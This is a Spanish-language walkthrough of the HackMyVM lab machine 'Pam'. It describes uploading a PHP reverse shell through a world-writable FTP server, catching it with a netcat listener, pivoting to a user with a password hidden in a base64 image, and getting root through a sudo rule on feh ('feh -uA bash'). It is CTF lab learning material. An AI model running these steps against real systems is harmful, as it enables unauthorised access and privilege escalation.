---
layout      : post
title       : "Pam - HackMyVm"
author      : elc4br4
image       : assets/images/HMV/Pam-HackMyVM/portada.jpg
category    : [ HackMyVM ]
tags        : [ Linux ]
---

Pam es una maquina de nivel medio de la plataforma HackMyVm, en la que tocaremos una forma de subir una reverse shell al servidor a través del servidor FTP, mostraré como se realizo el tratamiento de la tty y tendremos pivoting a un usuario para posteriormente escalar privilegios a través del binario feh.


## Escaneo de Puertos

```bash
Nmap scan report for 192.168.0.24
Host is up (0.0058s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0
Service Info: OS: Unix
```

Tenemos el puerto 80 (http) y el puerto 21 (ftp) abiertos.

Accedo al puerto 21 (ftp) para echar un vistazo y veo que tengo acceso a todo el sistema de ficheros.

A continuación procedo a mirar el puerto 80 (http).


## Explotación 

Dentro del navegador encuentro lo siguiente:

> phpipam is ready 

![](/assets/images/ HMV/Pam-HackMyVM/web1.png)

Buscando dentro del servidor ftp llego a la siguiente ruta donde se aloja el servicio web.

`` /var/www/html/phpipam ``

Sigo buscando a partir de esta ruta y llego a esta otra ruta:

`` /var/www/html/phpipam/app/subnets/import-subnet ``

![](/assets/images/HMV/Pam-HackMyVM/ftp1.png)

Tenemos el directorio /upload con todos los permisos.

Eso me quiere decir que probablemente podemos subir archivos al servidor para posteriormente ejecutarlos, y podría ser una forma de obtener una shell inversa.


Descargo una shell inversa en php de la siguiente fuente:

[https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

Una vez añadimos nuestra dirección ip y el puerto donde obtendremos la conexión inversa debemos subir la reverse shell al servidor web.

Usando el comando PUT dentro del servidor FTP podemos subir al directorio /uploads la reverse shell.

![](/assets/images/HMV/Pam-HackMyVM/ftp2.png)

Una vez subido abrimos un oyente en netcat con el puerto que configuramos anteriormente en la reverse shell.

`` nc -lnvp 1234 ``

Accedo a la ruta donde se ubica la reverse shell en el servidor web (desde el navegador) y ejecutamos la reverse shell, pero al ejecutar la reverse shell nos aparece el siguiente mensaje.

![](/assets/images/HMV/Pam-HackMyVM/web2.png)

Como vemos nos dice que el acceso ha sido denegado.
Para solucionarlo solo debemos asignarle permisos al archivo de la reverse shell en el servidor ftp con el comando chmod.

```bash
 ftp> chmod 777 php-reverse-shell.php 
    200 SITE CHMOD command ok.
```

Una vez cambiamos los permisos ya tendremos la conexión inversa.

![](/assets/images/HMV/Pam-HackMyVM/netcat1.png)

## Tratamiento de la tty

Ahora procedemos a realizar el tratamiento de la tty.

``` bash
$ script /dev/null -c bash 
Script started, output log file is '/dev/null'.
```

Después presionamos CTRL+Z para suspender la shell.

```bash
www-data@pam:/$ ^Z
[1]  + 5181 suspended  nc -lnvp 1234
```

Ahora reseteamos la configuración de la shell que hemos dejado en segundo plano con *reset* y *xterm*

```bash
❯ stty raw -echo; fg
[1]  + 5701 continued  nc -lnvp 1234
                                    reset
reset: unknown terminal type unknown
Terminal type? xterm
```

Exportamos la variables de entorno *TERM* y *SHELL*.

```bash
www-data@pam:/$ export TERM=xterm
www-data@pam:/$ export SHELL=bash
```
 
 Y ajustamos el tamaño de la tty para que ocupe toda la pantalla.

 Para ello nos abrimos una terminal local y ejecutamos el siguiente comando:

 ```bash
❯ stty size
31 126
 ```

En mi caso son 31 filas y 126 columnas que he de setear a continuación.

`` www-data@pam:/$ stty rows 31 columns 126 ``

Ahora ya tenemos la tty completamente funcional.

## Pivoting a usuario italia

A continuación procedo a leer el archivo passwd para descubrir usuarios, ya que soy www-data.

```bash
www-data@pam:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
italia:x:1000:1000:italia,,,:/home/italia:/bin/bash
anonymous:x:1001:1001:,,,:/home/anonymous:/bin/bash
```

Tenemos el usuario *italia* y tenemos que buscar formas de pivotar al mismo ya que actualmente somos www-data.

Tras enumerar y buscar durante un buen rato, pruebo a ver las conexiones existentes y activas con netstat pero este comando no existe y buscando en google encuentro un comando que le puede suplir, *ss*.


[https://www.ochobitshacenunbyte.com/2020/09/01/como-se-usa-el-comando-ss-en-linux/](https://www.ochobitshacenunbyte.com/2020/09/01/como-se-usa-el-comando-ss-en-linux/) 


`` ss -ntlup ``

**Comando Desglosado:**
- -n, --numeric       don't resolve service names
- -t, --tcp           display only TCP sockets
- -l, --listening     display listening sockets
- -u, --udp           display only UDP sockets
- -p, --processes     show process using socket


  ![](/assets/images/HMV/Pam-HackMyVM/pivoting1.png)

Como se puede ver, hay una conexión a través del puerto 12345.

Usando netcat me conecto al mismo.

Una vez me conecto pulsaré cualquier tecla y nos aparecerá data codificada en base64.

![](/assets/images/HMV/Pam-HackMyVM/netcat2.png)

Tras buscar y buscar encuentro que esta data codificada en base64 y se puede decodificar pero a imágen, es decir, esta data es una imágen.

A través de una herramienta online consigo obtener la foto.

![](/assets/images/HMV/Pam-HackMyVM/web3.png)

[https://base64-to-image.com/](https://base64-to-image.com/)

Una vez hemos decodificado la foto podemos ver en la imágen la palabra:

`` rootisCLOSE ``

Ahora intentamos loguearnos como el usuario italia.

```bash
www-data@pam:/$ su italia
Password: 
italia@pam:/$ whoami
italia
italia@pam:/$
 ```

 Una vez ya nos hemos convertido en el usuario italia podemos leer la flag user.

 ## Escalada de Privilegios

 Para leer la flag root debemos escalar privilegios y como de costumbre comienzo enumerando posibles vectores de escalada de privilegios.

 ```bash
italia@pam:/$ sudo -l
Matching Defaults entries for italia on pam:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User italia may run the following commands on pam:
    (ALL : ALL) NOPASSWD: /usr/bin/feh
 ```

 Podemos ejecutar el binario feh sin contraseña, usaremos este binario para escalar los privilegios.

 Solo debemos buscar la forma...

 Leyendo en el manual del binario feh encuentro varios parámetros que podrían servirme:

 ```bash
-A, --action [flag][[title]]action

             Specify a shell command as an action to perform on the image.

 -u, --unloadable

             Don't display images.  Just print out their names if imlib2 can

             NOT successfully load them.  Returns false if at least one image

             was loadable.
```                         

```bash
italia@pam:/$ sudo /usr/bin/feh -uA bash
./initrd.img
root@pam:/# id
uid=0(root) gid=0(root) grupos=0(root)
root@pam:/# whoami
root
```

Y listo, ya somos root.

> ¡¡¡PERO EXISTE UN PROBLEMA!!!

![](/assets/images/HMV/Pam-HackMyVM/problema.jpg)

La flag del usuario root está codificada.
Para saber la codificación uso el comando file:

```bash
root@pam:~# file root.enc 
root.enc: openssl enc'd data with salted password
```

Está encodeada con openssl.

Para decodificarla encuentro el siguiente recurso:

[https://www.shellhacks.com/encrypt-decrypt-file-password-openssl/](https://www.shellhacks.com/encrypt-decrypt-file-password-openssl/)

Intento decodificarla pero me pide una password... 

> Presten atención, la contraseña está más cerca de lo que piensan...
